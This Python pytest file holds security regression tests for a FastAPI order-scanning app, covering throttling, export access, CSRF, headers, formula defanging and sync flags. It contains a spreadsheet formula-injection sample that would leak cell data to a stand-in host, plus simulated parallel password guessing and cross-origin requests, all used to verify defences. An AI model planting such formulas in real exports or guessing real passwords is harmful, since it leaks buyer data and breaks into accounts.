"""Security + concurrency review, 9 Oct 2026: bounded reports, staff-only exports, sign-in throttle that counts
parallel guesses, request size limit, cross-site writes refused, security headers, no live formulas in exports, and
the sync never turning a "shipped in OMSGuru" mark or a packer's flag back into a plain scan."""
import threading
from types import SimpleNamespace

import pytest
from fastapi import HTTPException
from fastapi.testclient import TestClient
from openpyxl import Workbook
from sqlalchemy import select

from app.db import session_scope
from app.main import app
from app.models import MARKED_SHIPPED_FLAG, Channel, OmsOrder, Scan, User
from app.routers import auth as auth_router
from app.security import hash_password
from app.services import exports, scanning
from app.timeutil import today_dispatch_date, utcnow

ADMIN = {"username": "admin", "password": "test-admin-pass"}


@pytest.fixture(scope="module")
def admin():
    with TestClient(app) as c:
        assert c.post("/api/auth/login", json=ADMIN).status_code == 200
        yield c


def _scanner_client() -> TestClient:
    with session_scope() as db:
        if db.scalar(select(User).where(User.username == "sec.scanner")) is None:
            db.add(User(username="sec.scanner", full_name="Sec Scanner", role="scanner",
                        password_hash=hash_password("Scanner-pass-2026")))
    c = TestClient(app)
    assert c.post("/api/auth/login", json={"username": "sec.scanner", "password": "Scanner-pass-2026"}).status_code == 200
    return c


def test_reports_refuse_unbounded_date_ranges(admin):
    r = admin.get("/api/reports/channel-summary.xlsx",
                  params={"date_from": "0001-01-01", "date_to": "9999-12-30", "group": "day"})
    assert r.status_code == 400  # ran for hours before
    for path in ("/api/reports/operators", "/api/reports/sku-summary", "/api/reports/filters"):
        assert admin.get(path, params={"date_from": "2020-01-01", "date_to": "2026-10-01"}).status_code == 400, path
    assert admin.get("/api/scans/export.xlsx", params={"date_from": "2026-01-01", "date_to": "2026-10-01"}).status_code == 400
    assert admin.get("/api/scans", params={"date_from": "2026-01-01", "date_to": "2026-10-01", "q": "AB"}).status_code == 400
    assert admin.get("/api/reports/operators").status_code == 200  # today is fine


def test_exports_with_buyer_details_are_staff_only(admin):
    with _scanner_client() as sc:
        assert sc.get("/api/scans/export.xlsx").status_code == 403
        assert sc.get("/api/scans/export.csv").status_code == 403
    assert admin.get("/api/scans/export.csv").status_code == 200


def test_parallel_wrong_guesses_all_count():
    """The old throttle wrote failures back only after bcrypt: 40 parallel guesses counted as one."""
    req = SimpleNamespace(client=SimpleNamespace(host="203.0.113.9"))
    ok, refused = [], []

    def guess():
        try:
            ok.append(auth_router._attempt("victim.user", req))
        except HTTPException as exc:
            refused.append(exc.status_code)

    threads = [threading.Thread(target=guess) for _ in range(20)]
    [t.start() for t in threads]
    [t.join() for t in threads]
    assert len(ok) == auth_router.MAX_FAILURES and set(refused) == {429}
    # another IP still has its own 8, but the account as a whole stops at 30
    for i in range(auth_router.MAX_ACCOUNT_FAILURES - auth_router.MAX_FAILURES):
        auth_router._attempt("victim.user", SimpleNamespace(client=SimpleNamespace(host=f"198.51.100.{i}")))
    with pytest.raises(HTTPException) as e:
        auth_router._attempt("victim.user", SimpleNamespace(client=SimpleNamespace(host="192.0.2.77")))
    assert e.value.status_code == 429
    auth_router._signed_in(("victim.user|203.0.113.9", "acct|victim.user"))


def test_big_request_bodies_are_refused_unread():
    with TestClient(app) as c:
        r = c.post("/api/auth/login", content=b"{" + b" " * 2_000_000 + b"}",
                   headers={"content-type": "application/json"})
        assert r.status_code == 413


def test_cross_site_writes_with_the_cookie_are_refused(admin):
    r = admin.post("/api/auth/logout", headers={"origin": "https://evil.example"})
    assert r.status_code == 403
    assert admin.post("/api/auth/logout", headers={"origin": "http://testserver"}).status_code == 200
    assert admin.post("/api/auth/login", json=ADMIN).status_code == 200  # signed in again for the next tests


def test_security_headers_and_no_public_api_docs(admin):
    h = admin.get("/api/health").headers
    assert h["x-content-type-options"] == "nosniff" and h["x-frame-options"] == "DENY"
    assert "swagger" not in admin.get("/docs").text.lower()
    r = admin.get("/openapi.json")
    assert r.status_code != 200 or "openapi" not in r.text[:200]


def test_exports_never_hold_live_formulas():
    wb = Workbook()
    wb.active.append(["Buyer", '=HYPERLINK("https://x.example/?"&A1,"open")'])
    exports._defang(wb)
    assert wb.active["B1"].data_type == "s"
    assert exports.csv_safe("=1+1") == "'=1+1" and exports.csv_safe("@SUM(A1)") == "'@SUM(A1)"
    assert exports.csv_safe("-12.5") == "-12.5" and exports.csv_safe("FMPC123") == "FMPC123" and exports.csv_safe(7) == 7


def test_sync_keeps_marks_and_packer_flags():
    """A re-check after a sync rewrote flags: the mark became a plain scan (its real scan then said DUPLICATE) and a
    packer's "FLAGGED" was cleared."""
    with session_scope() as db:
        ch = db.scalar(select(Channel).where(Channel.scan_enabled.is_(True)))
        if ch is None:  # this module run on its own: no synced channels yet
            ch = Channel(id=990001, name="SEC - Test", marketplace="Test")
            db.add(ch)
            db.flush()
        u = db.scalar(select(User).where(User.username == "admin"))
        for awb, flags in (("SECMARK0001", MARKED_SHIPPED_FLAG), ("SECFLAG0001", "FLAGGED")):
            db.add(OmsOrder(oms_key=f"sec-{awb}", tracking_raw=awb, tracking_norm=awb, channel_id=ch.id,
                            channel_label=ch.name, channel_order_id=f"OD{awb}", status_group="OPEN",
                            awb_generated_at=utcnow()))
            db.add(Scan(tracking_norm=awb, tracking_raw=awb, dispatch_date=today_dispatch_date(), scanned_at=utcnow(),
                        user_id=u.id, channel_id=ch.id, result="WARN" if flags == "FLAGGED" else "OK", flags=flags,
                        message="Missing item" if flags == "FLAGGED" else "marked"))
    with session_scope() as db:
        scanning.reverify_scans(db, {"SECMARK0001", "SECFLAG0001"})
    with session_scope() as db:
        mark = db.scalar(select(Scan).where(Scan.tracking_norm == "SECMARK0001"))
        flagged = db.scalar(select(Scan).where(Scan.tracking_norm == "SECFLAG0001"))
        assert MARKED_SHIPPED_FLAG in mark.flags
        assert "FLAGGED" in flagged.flags and flagged.result == "WARN" and flagged.message == "Missing item"
        for awb in ("SECMARK0001", "SECFLAG0001"):
            db.query(Scan).filter(Scan.tracking_norm == awb).delete()
            db.query(OmsOrder).filter(OmsOrder.tracking_norm == awb).delete()


def test_one_account_cannot_flood_scans(admin, monkeypatch):
    from app.routers import scan as scan_router

    monkeypatch.setattr(scan_router, "SCAN_RATE_PER_MIN", 3)
    monkeypatch.setattr(scan_router, "_scan_times", {})
    with session_scope() as db:
        ch = db.scalar(select(Channel).where(Channel.scan_enabled.is_(True)))
    codes = [admin.post("/api/scan", json={"channel_id": ch.id if ch else 1, "tracking": f"RATE{i:08d}"}).status_code
             for i in range(5)]
    assert codes[3] == 429 and codes[4] == 429 and 429 not in codes[:3]


def test_manual_sync_buttons_have_a_cooldown(admin, monkeypatch):
    from app.routers import admin as admin_router

    monkeypatch.setattr(admin_router, "_last_trigger", {})
    monkeypatch.setattr(admin_router, "get_engine", lambda: SimpleNamespace(request_full=lambda job: None,
                                                                          request_urgent=lambda: None, _last_urgent=0))
    assert admin.post("/api/admin/sync/audit").status_code == 200
    assert admin.post("/api/admin/sync/audit").status_code == 429
    assert admin.post("/api/admin/sync/cleanup").status_code == 200  # another job is its own button


def test_batch_sheet_with_buyer_pincodes_is_staff_only():
    with _scanner_client() as sc:
        assert sc.get("/api/manifests/1/export.xlsx").status_code == 403


def test_a_failing_scan_is_recorded_for_rescanning(admin, monkeypatch):
    """9 Oct 2026: a database error failed every scan for 4 hours and nothing showed which packets to scan again."""
    from app.models import ScanEvent
    from app.routers import scan as scan_router

    def boom(*a, **k):
        raise RuntimeError("database said no")

    monkeypatch.setattr(scan_router, "process_scan", boom)
    with session_scope() as db:
        ch = db.scalar(select(Channel).where(Channel.scan_enabled.is_(True)))
    r = admin.post("/api/scan", json={"channel_id": ch.id, "tracking": "FAILSAVE0001"})
    assert r.status_code == 500 and "NOT saved" in r.json()["detail"]
    with session_scope() as db:
        ev = db.scalar(select(ScanEvent).where(ScanEvent.tracking_norm == "FAILSAVE0001"))
        assert ev is not None and ev.outcome == "ERROR" and "database said no" in ev.message
